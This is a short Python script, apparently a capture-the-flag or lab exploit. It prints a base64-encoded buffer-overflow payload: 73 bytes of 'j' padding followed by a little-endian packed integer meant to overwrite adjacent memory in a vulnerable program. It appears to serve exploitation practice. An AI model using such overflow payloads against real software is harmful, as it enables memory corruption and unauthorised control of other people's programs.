
import sys
import struct
import base64

buf = b'jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj'
buf += struct.pack('<I', 1764793783)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
